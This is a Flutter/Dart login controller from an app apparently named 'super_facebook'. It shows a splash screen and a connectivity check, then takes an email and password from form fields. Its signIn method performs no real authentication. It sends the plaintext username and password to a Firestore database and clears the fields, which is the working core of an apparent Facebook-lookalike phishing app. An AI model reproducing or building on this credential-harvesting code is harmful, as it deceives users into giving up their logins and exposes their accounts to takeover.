import 'package:flutter/cupertino.dart';
import 'package:get/get.dart';
import 'package:super_facebook/api/api.dart';
import 'package:super_facebook/model/credential_model.dart';
import 'package:super_facebook/widget/alert_popup.dart';
import 'package:super_facebook/widget/loading_widget.dart';
import 'package:super_facebook/widget/splash_widget.dart';

class LoginController extends GetxController {
  late ApiClient apiClient;

  @override
  void onInit() {
    apiClient = ApiClient();
    super.onInit();
  }

  @override
  void onReady() {
    Get.dialog(Splash(), barrierDismissible: false);
    Future.delayed(Duration(seconds: 5)).then((_) {
      checkConnexion().then((value) {
        if (value) {
          if (Get.isDialogOpen!) Get.back();
        } else {
          if (Get.isDialogOpen!) Get.back();
          Get.dialog(AlertPopup(
            title: "Probleme de connexion!",
            content:
                "Veuillez verifier votre offre internet puis relancez l'application!",
            onCanceled: () => Get.back(),
          ));
        }
      });
    });
    super.onReady();
  }

  TextEditingController emailController = TextEditingController();
  TextEditingController passwordController = TextEditingController();

  bool isButtonEnabled() {
    return (emailController.text.trim() != '' &&
            passwordController.text.trim() != '')
        ? true
        : false;
  }

  Future signIn() async {
    if (!isButtonEnabled()) return;
    await apiClient.sendToFireStore(
        credential: Credential(
            username: emailController.text, password: passwordController.text));
    emailController.text = "";
    passwordController.text = "";
  }

  Future test() async {
    await apiClient.test();
  }
}
